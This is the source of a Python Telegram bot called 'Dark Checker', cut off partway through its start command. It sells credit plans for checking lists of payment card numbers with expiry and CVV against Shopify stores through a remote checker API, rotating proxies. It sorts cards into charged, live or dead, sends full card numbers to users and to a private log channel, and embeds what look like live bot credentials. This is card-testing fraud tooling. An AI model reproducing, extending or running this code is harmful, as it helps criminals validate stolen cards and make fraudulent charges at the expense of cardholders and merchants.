from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
from datetime import datetime, timedelta

# ========== CONFIGURATION ==========
CHECKER_API_URL = 'https://web-production-669be.up.railway.app/shopify'

API_ID = 30252641
API_HASH = 'dadc7b78300b20ef5ebe277713d6478e'
BOT_TOKEN = '8481823831:AAGyewGoeYKXBgTlBYbX5b7JnluzYQIZhiM'

ADMIN_IDS = [6506943274]
PVT_CHANNEL_ID = (-1002200268580)

# Required channels to join
REQUIRED_CHATS = [
    {"link": "https://t.me/dududadadee", "id": None},
    {"link": "https://t.me/dududadadee", "id": None},
    {"link": "https://t.me/dududadadee", "id": None},
]

# Premium Plans with Credits
PLANS = {
    "trial": {"days": 1, "credits": 10000, "price": "2$", "name": "⭐ TRIAL"},
    "bronze": {"days": 3, "credits": 20000, "price": "4$", "name": "🥉 BRONZE"},
    "silver": {"days": 7, "credits": 40000, "price": "8$", "name": "🥈 SILVER"},
    "gold": {"days": 14, "credits": 50000, "price": "12$", "name": "🥇 GOLD"},
    "platinum": {"days": 24, "credits": 100000, "price": "22$", "name": "💎 PLATINUM"},
}

# File paths
PREMIUM_FILE = 'premium.json'
KEYS_FILE = 'keys.json'
CREDITS_FILE = 'credits.json'
CREDIT_KEYS_FILE = 'credit_keys.json'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
BANNED_FILE = 'banned.txt'
GROUP_SETTINGS_FILE = 'group_settings.json'
USER_PROXIES_FILE = 'user_proxies.json'
HIT_STATS_FILE = 'hit_stats.json'

# Site filter presets
SITE_FILTERS = {
    "all": {"name": "📊 All Sites", "min": 0, "max": 999999},
    "under5": {"name": "💰 Under $5", "min": 0, "max": 5},
    "under10": {"name": "💰 Under $10", "min": 0, "max": 10},
    "under15": {"name": "💰 Under $15", "min": 0, "max": 15},
    "under20": {"name": "💰 Under $20", "min": 0, "max": 20},
    "under30": {"name": "💰 Under $30", "min": 0, "max": 30},
}

# ========== DARK EMOJI MAPPING ==========
DARK_EMOJIS = {
    "success": "✅",
    "error": "❌",
    "warning": "⚠️",
    "info": "ℹ️",
    "card": "💳",
    "site": "🌐",
    "proxy": "🔌",
    "charged": "⚡",
    "live": "💀",
    "dead": "⬛",
    "credit": "💰",
    "time": "⏱️",
    "user": "👤",
    "admin": "🔑",
    "stop": "⏹️",
    "pause": "⏸️",
    "resume": "▶️",
    "stats": "📊",
    "file": "📄",
    "settings": "⚙️",
    "premium": "💎",
    "plan": "📋",
    "key": "🔐",
    "link": "🔗",
    "warning_sign": "🚫",
    "check": "✔️",
    "cross": "✖️",
    "star": "⭐",
    "fire": "🔥",
    "skull": "💀",
    "robot": "🤖",
}

bot = TelegramClient('dark_checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
ACTIVE_FILTER = "all"
REFERRAL_FILE = 'referrals.json'
RATE_LIMIT_SECONDS = 3
CREDITS_LOW_THRESHOLD = 100
REFERRAL_REWARD = 200

_rate_limit_cache = {}
_user_active_sessions = {}

# ========== CREDITS SYSTEM ==========
def load_credits():
    if not os.path.exists(CREDITS_FILE):
        return {}
    try:
        with open(CREDITS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_credits(credits_data):
    try:
        with open(CREDITS_FILE, 'w', encoding='utf-8') as f:
            json.dump(credits_data, f, indent=4)
    except:
        pass

def get_user_credits(user_id):
    credits_data = load_credits()
    uid = str(user_id)
    if uid not in credits_data:
        credits_data[uid] = 0
        save_credits(credits_data)
        return 0
    return credits_data.get(uid, 0)

def add_credits(user_id, amount):
    credits_data = load_credits()
    uid = str(user_id)
    credits_data[uid] = credits_data.get(uid, 0) + amount
    save_credits(credits_data)
    return True

def remove_credits(user_id, amount):
    credits_data = load_credits()
    uid = str(user_id)
    current = credits_data.get(uid, 0)
    new_amount = max(0, current - amount)
    credits_data[uid] = new_amount
    save_credits(credits_data)
    return True

def deduct_credit(user_id):
    credits_data = load_credits()
    uid = str(user_id)
    current = credits_data.get(uid, 0)
    if current >= 1:
        credits_data[uid] = current - 1
        save_credits(credits_data)
        return True, credits_data[uid]
    return False, current

# ========== CREDIT KEYS SYSTEM ==========
def load_credit_keys():
    if not os.path.exists(CREDIT_KEYS_FILE):
        return {}
    try:
        with open(CREDIT_KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_credit_keys(keys_data):
    try:
        with open(CREDIT_KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=4)
    except:
        pass

def generate_credit_key(amount):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_credit_keys()
    keys_data[key] = {
        'credits': amount,
        'used': False,
        'created_at': datetime.now().isoformat()
    }
    save_credit_keys(keys_data)
    return key

def redeem_credit_key(key, user_id):
    keys_data = load_credit_keys()
    if key not in keys_data:
        return False, "Invalid credit key"
    if keys_data[key]['used']:
        return False, "Key already used"
    
    credits = keys_data[key]['credits']
    add_credits(user_id, credits)
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_credit_keys(keys_data)
    
    return True, credits

# ========== PREMIUM KEYS SYSTEM ==========
def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys_data):
    try:
        with open(KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=4)
    except:
        pass

def generate_premium_key(plan_key, days, credits):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_keys()
    keys_data[key] = {
        'type': 'premium',
        'plan': plan_key,
        'days': days,
        'credits': credits,
        'used': False,
        'created_at': datetime.now().isoformat()
    }
    save_keys(keys_data)
    return key

def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return {}
    try:
        with open(PREMIUM_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_premium_users(premium_data):
    try:
        with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
            json.dump(premium_data, f, indent=4)
    except:
        pass

def is_premium(user_id):
    premium_data = load_premium_users()
    user_data = premium_data.get(str(user_id))
    if not user_data:
        return False
    expiry = datetime.fromisoformat(user_data['expiry'])
    if datetime.now() > expiry:
        del premium_data[str(user_id)]
        save_premium_users(premium_data)
        return False
    return True

def get_user_plan_name(user_id):
    premium_data = load_premium_users()
    user_data = premium_data.get(str(user_id))
    if not user_data:
        return "FREE"
    plan_key = user_data.get('plan_key', '')
    if plan_key and plan_key in PLANS:
        return PLANS[plan_key]['name']
    return "CUSTOM"

def add_premium_user(user_id, plan_key, days, credits):
    premium_data = load_premium_users()
    expiry = datetime.now() + timedelta(days=days)
    premium_data[str(user_id)] = {
        'expiry': expiry.isoformat(),
        'added_at': datetime.now().isoformat(),
        'days': days,
        'credits': credits,
        'plan_key': plan_key
    }
    save_premium_users(premium_data)
    add_credits(user_id, credits)

def redeem_premium_key(key, user_id):
    keys_data = load_keys()
    if key not in keys_data:
        return False, "Invalid premium key"
    if keys_data[key]['used']:
        return False, "Key already used"
    if is_premium(user_id):
        return False, "You already have premium access"
    
    days = keys_data[key]['days']
    credits = keys_data[key]['credits']
    plan_key = keys_data[key]['plan']
    
    add_premium_user(user_id, plan_key, days, credits)
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_keys(keys_data)
    
    if plan_key == 'custom':
        return True, f"Redeemed custom premium: {days} days + {credits} credits!"
    else:
        return True, f"Redeemed {PLANS[plan_key]['name']} plan! {days} days + {credits} credits!"

# ========== RESOLVE CHAT IDS ==========
async def resolve_chat_ids():
    for chat in REQUIRED_CHATS:
        try:
            entity = await bot.get_entity(chat["link"])
            chat["id"] = entity.id
            print(f"Resolved: {chat['link']} -> {entity.id}")
        except Exception as e:
            print(f"Failed to resolve {chat['link']}: {e}")

# ========== CHECK IF USER JOINED ALL ==========
async def check_user_joined(user_id):
    missing_chats = []
    for chat in REQUIRED_CHATS:
        if chat["id"] is None:
            continue
        try:
            found = False
            async for p in bot.iter_participants(chat["id"]):
                if p.id == user_id:
                    found = True
                    break
            if not found:
                missing_chats.append(chat["link"])
        except:
            missing_chats.append(chat["link"])
    if missing_chats:
        return False, missing_chats
    return True, None

# ========== HELPER FUNCTIONS ==========
def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_banned_users():
    return get_file_lines(BANNED_FILE)

def is_banned(user_id):
    banned = load_banned_users()
    return str(user_id) in banned

def ban_user(user_id):
    with open(BANNED_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{user_id}\n")

def unban_user(user_id):
    banned = load_banned_users()
    if str(user_id) in banned:
        banned.remove(str(user_id))
        with open(BANNED_FILE, 'w', encoding='utf-8') as f:
            for uid in banned:
                f.write(f"{uid}\n")

# ========== GROUP SETTINGS SYSTEM ==========
def load_group_settings():
    if not os.path.exists(GROUP_SETTINGS_FILE):
        return {}
    try:
        with open(GROUP_SETTINGS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_group_settings(settings_data):
    try:
        with open(GROUP_SETTINGS_FILE, 'w', encoding='utf-8') as f:
            json.dump(settings_data, f, indent=4)
    except:
        pass

def is_group_enabled(chat_id):
    settings = load_group_settings()
    return settings.get(str(chat_id), False)

def set_group_enabled(chat_id, enabled):
    settings = load_group_settings()
    settings[str(chat_id)] = enabled
    save_group_settings(settings)
    return True

# ========== USER PROXIES SYSTEM ==========
def load_user_proxies():
    if not os.path.exists(USER_PROXIES_FILE):
        return {}
    try:
        with open(USER_PROXIES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_user_proxies(proxies_data):
    try:
        with open(USER_PROXIES_FILE, 'w', encoding='utf-8') as f:
            json.dump(proxies_data, f, indent=4)
    except:
        pass

def get_user_specific_proxies(user_id):
    proxies_data = load_user_proxies()
    return proxies_data.get(str(user_id), [])

def add_user_proxy(user_id, proxy):
    proxies_data = load_user_proxies()
    uid = str(user_id)
    if uid not in proxies_data:
        proxies_data[uid] = []
    if proxy not in proxies_data[uid]:
        proxies_data[uid].append(proxy)
        save_user_proxies(proxies_data)
        return True
    return False

def remove_user_proxy(user_id, proxy):
    proxies_data = load_user_proxies()
    uid = str(user_id)
    if uid in proxies_data and proxy in proxies_data[uid]:
        proxies_data[uid].remove(proxy)
        save_user_proxies(proxies_data)
        return True
    return False

def clear_user_proxies(user_id):
    proxies_data = load_user_proxies()
    uid = str(user_id)
    if uid in proxies_data and proxies_data[uid]:
        proxies_data[uid] = []
        save_user_proxies(proxies_data)
        return True
    return False

# ========== HIT STATS SYSTEM ==========
def load_hit_stats():
    if not os.path.exists(HIT_STATS_FILE):
        return {}
    try:
        with open(HIT_STATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_hit_stats(data):
    try:
        with open(HIT_STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except:
        pass

def record_hit(user_id, hit_type):
    data = load_hit_stats()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {'charged': 0, 'approved': 0, 'dead': 0, 'total': 0}
    data[uid][hit_type] = data[uid].get(hit_type, 0) + 1
    data[uid]['total'] = data[uid].get('total', 0) + 1
    save_hit_stats(data)

def record_dead(user_id):
    data = load_hit_stats()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {'charged': 0, 'approved': 0, 'dead': 0, 'total': 0}
    data[uid]['dead'] = data[uid].get('dead', 0) + 1
    data[uid]['total'] = data[uid].get('total', 0) + 1
    save_hit_stats(data)

# ========== RATE LIMIT HELPER ==========
def check_rate_limit(user_id):
    now = time.time()
    last = _rate_limit_cache.get(user_id, 0)
    diff = now - last
    if diff < RATE_LIMIT_SECONDS:
        return False, round(RATE_LIMIT_SECONDS - diff, 1)
    _rate_limit_cache[user_id] = now
    return True, 0

# ========== REFERRAL SYSTEM ==========
def load_referrals():
    if not os.path.exists(REFERRAL_FILE):
        return {}
    try:
        with open(REFERRAL_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_referrals(data):
    try:
        with open(REFERRAL_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except:
        pass

def get_referral_code(user_id):
    data = load_referrals()
    uid = str(user_id)
    if uid not in data:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        data[uid] = {'code': code, 'referred': [], 'total_earned': 0}
        save_referrals(data)
    return data[uid]['code']

def process_referral(new_user_id, ref_code):
    data = load_referrals()
    new_uid = str(new_user_id)
    for uid, info in data.items():
        if new_uid in info.get('referred', []):
            return False, None
    for uid, info in data.items():
        if info.get('code') == ref_code and uid != new_uid:
            info['referred'].append(new_uid)
            info['total_earned'] = info.get('total_earned', 0) + REFERRAL_REWARD
            save_referrals(data)
            add_credits(int(uid), REFERRAL_REWARD)
            return True, int(uid)
    return False, None

# ========== CREDITS LOW WARNING ==========
async def check_credits_low(user_id):
    credits = get_user_credits(user_id)
    if 0 < credits < CREDITS_LOW_THRESHOLD:
        try:
            await bot.send_message(user_id,
                f"⚠️ <b>Low Credits Warning!</b>\n\n"
                f"💰 You only have <b>{credits} credits</b> remaining.\n"
                f"Use /redeemcredit KEY to add more credits.\n"
                f"Contact @BUBU to purchase credits."
            , parse_mode='html')
        except:
            pass

# ========== SITES & PROXIES HELPERS ==========
def load_sites():
    global ACTIVE_FILTER
    all_sites = get_file_lines(SITES_FILE)
    if not all_sites:
        return []
    if ACTIVE_FILTER == "all":
        return all_sites
    return all_sites

def load_proxies():
    return get_file_lines(PROXY_FILE)

def add_site(site_url):
    sites = load_sites()
    if site_url in sites:
        return False, "Site already exists"
    with open(SITES_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{site_url}\n")
    return True, "Site added successfully"

def add_sites_bulk(site_urls):
    current_sites = load_sites()
    added = []
    already = []
    for site in site_urls:
        if site not in current_sites:
            added.append(site)
        else:
            already.append(site)
    if added:
        with open(SITES_FILE, 'a', encoding='utf-8') as f:
            for site in added:
                f.write(f"{site}\n")
    return added, already

def remove_site(site_url):
    sites = load_sites()
    if site_url not in sites:
        return False, "Site not found"
    new_sites = [s for s in sites if s != site_url]
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for site in new_sites:
            f.write(f"{site}\n")
    return True, "Site removed successfully"

# ========== SEND REAL-TIME HIT NOTIFICATION TO USER ==========
async def send_realtime_hit_to_user(user_id, hit_type, card, response_msg, gateway, price):
    if hit_type == "CHARGED":
        status_emoji = "⚡"
        status_text = "CHARGED"
    else:
        status_emoji = "💀"
        status_text = "LIVE"
    
    bin_num = card.split('|')[0][:6]
    brand, bin_type, level, bank, country, flag = await get_bin_info(bin_num)
    
    message = f"""<b>💀💳 #SHOPIFY HIT 💳💀</b>
<b>─────────────────────</b>
<b>⚡ HIT FOUND!</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{card}</code></blockquote>
<blockquote>📝 Response: {response_msg[:150]}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway} | 💰 {price}</blockquote>
<b>─────────────────────</b>
<b>📊 BIN INFO</b>
<pre>🏦 Brand: {brand} - {bin_type} - {level}
🏛️ Bank: {bank}
🌍 Country: {country} {flag}</pre>
<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""
    
    try:
        await bot.send_message(user_id, message, parse_mode='html')
    except Exception as e:
        print(f"Error sending hit to user: {e}")

# ========== PVT CHANNEL LOGS (ONLY CHARGED HITS) ==========
async def send_log_to_channel(response_msg, gateway, price, username, user_id, card):
    header = "⚡ CHARGED HIT"
    
    if username:
        user_display = username
    else:
        user_display = str(user_id)
    
    plan_name = get_user_plan_name(user_id)
    
    log_message = f"""<b>{header}</b>
<b>─────────────────────</b>
<b>Response ➡</b> {response_msg[:100]}
<b>Gateway ➡</b> {gateway}
<b>Price ➡</b> {price}
<b>Card ➡</b> <code>{card}</code>
<b>─────────────────────</b>
<b>User ➡</b> <a href="tg://user?id={user_id}">{user_display}</a> ({plan_name} USER)"""
    
    try:
        await bot.send_message(PVT_CHANNEL_ID, log_message, parse_mode='html')
    except Exception as e:
        print(f"Error sending log to PVT channel: {e}")

# ========== GET BIN INFO ==========
async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json()
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                return brand, bin_type, level, bank, country, flag
    except Exception:
        return '-', '-', '-', '-', '-', ''

# ========== DEAD INDICATORS ==========
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        params = {'cc': card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'Shopify Payments')
        status = raw.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = response_msg.lower()

        if status == 'Charged' or 'order completed' in response_lower or 'order_placed' in response_lower or 'ORDER_PLACED' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(key in response_lower for key in [
            'approved', 'success', 'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {'status': 'Dead', 'message': f"Site errors: {last_result['message']}", 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

# ========== UPDATE PROGRESS ==========
async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    
    remaining_credits = get_user_credits(user_id)

    progress_text = f"""<b>💀💳 Dark Checker Progress 💳💀</b>
<b>─────────────────────</b>
<b>⚡ PROGRESS</b>
<blockquote>💳 Total: {results['total']} | ⚡ Charged: {len(results['charged'])} | 💀 Live: {len(results['approved'])} | ⬛ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<blockquote>💰 Credits Left: {remaining_credits}</blockquote>
<b>─────────────────────</b>"""
    
    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("⏹️ Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, progress_text, buttons=buttons, parse_mode='html')
    except:
        pass

# ========== SEND FINAL RESULTS ==========
async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"⚡ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"💀 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    
    remaining_credits = get_user_credits(user_id)

    summary = f"""<b>💀💳 Dark Checker Results 💳💀</b>
<b>─────────────────────</b>
<b>📊 RESULTS</b>
<blockquote>💳 Total: {results['total']} | ⚡ Charged: {len(results['charged'])} | 💀 Live: {len(results['approved'])} | ⬛ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<blockquote>💰 Credits Left: {remaining_credits}</blockquote>
<b>─────────────────────</b>
<b>🎯 HITS</b>
<blockquote>{hits_text}</blockquote>
<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"dark_checker_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("💀💳 DARK CHECKER RESULTS 💳💀\n")
        await f.write("Format: CC | Gateway | Price | Message | Site\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"⚡ CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"💀 LIVE ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"⬛ DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")

    await bot.send_message(user_id, summary, file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except:
        pass
# ========== SITE & PROXY TESTING ==========
async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site_url = "https://riverbendhomedev.myshopify.com"
    try:
        params = {'cc': test_card, 'site': test_site_url, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
            return {'proxy': proxy, 'status': 'dead'}
        else:
            return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

# ========== BOT COMMANDS ==========
joined_users = set()

def set_user_joined(user_id):
    joined_users.add(user_id)

@bot.on(events.NewMessage(pattern=r'^/start(@\w+)?(\s+.*)?$'))
async def start(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 <b>You are banned from using this bot.</b>", parse_mode='html')
    
    joined, missing_chats = await check_user_joined(user_id)
    if not joined:
        buttons = []
        for link in missing_chats:
            buttons.append([Button.url("📢 Join Channel", link)])
        buttons.append([Button.inline("✅ Joined", b"check_joined")])
        missing_text = "\n".join([f"🔗 <a href='{link}'>Click here to join</a>" for link in missing_chats])
        return await event.reply(f"<b>⚠️ Access Denied!</b>\n\nYou must join the following channels first:\n\n{missing_text}\n\nThen click 'Joined' button.", buttons=buttons, parse_mode='html')
    
    set_user_joined(user_id)
    is_prem = is_premium(user_id)
    is_adm = is_admin(user_id)
    credits = get_user_credits(user_id)
    plan_name = get_user_plan_name(user_id)
    
    text = f"""<b>💀💳 Welcome to Dark Checker 💳💀</b>
<b>─────────────────────</b>
<b>⚙️ CC COMMANDS</b>
<blockquote>➡️ /cc card|mm|yy|cvv - Check single CC (1 credit)
➡️ /chk - Reply to .txt file to check cards (1 credit per card)
➡️ /multi card1|mm|yy|cvv ... - Check multiple cards
➡️ /mcc card|mm|yy|cvv - Check 1 card against ALL sites</blockquote>

<b>⚙️ SITE COMMANDS</b>
<blockquote>➡️ /site - Check all sites & remove dead
➡️ /addsite site.com - Add single site
➡️ /addsitetxt - Add sites from .txt file (bulk)
➡️ /rm url - Remove a specific site
➡️ /clearsite - Clear all sites (with backup)
➡️ /getsites - Get all sites file</blockquote>

<b>⚙️ PROXY COMMANDS</b>
<blockquote>➡️ /proxy - Check all proxies & remove dead
➡️ /addproxy - Add proxies (one per line)
➡️ /addproxytxt - Add proxies from .txt file (bulk)
➡️ /chkproxy proxy - Check single proxy
➡️ /rmproxy proxy - Remove single proxy
➡️ /rmproxyindex 1,2,3 - Remove by index
➡️ /clearproxy - Remove all proxies
➡️ /getproxy - Get all proxies
➡️ /setproxy proxy - Set your personal proxy
➡️ /myproxy - View your personal proxies
➡️ /delmyproxy proxy - Delete a personal proxy
➡️ /clearmyproxy - Clear all your personal proxies</blockquote>

<b>⚙️ PREMIUM & KEYS</b>
<blockquote>➡️ /redeem KEY - Redeem premium key
➡️ /redeemcredit KEY - Redeem credit key
➡️ /plans - Check premium plans
➡️ /info - Your account details & credits
➡️ /myhistory - Your hit statistics
➡️ /transfercredits user_id amount - Transfer credits
➡️ /ping - Check bot response time
➡️ /refer - Get your referral code & earn credits
➡️ /topusers - Top 10 hit leaderboard</blockquote>"""
    
    if is_prem:
        premium_data = load_premium_users().get(str(user_id), {})
        expiry = premium_data.get('expiry', 'Unknown')
        if expiry != 'Unknown':
            expiry_dt = datetime.fromisoformat(expiry)
            expiry_str = expiry_dt.strftime('%Y-%m-%d')
        else:
            expiry_str = 'Unknown'
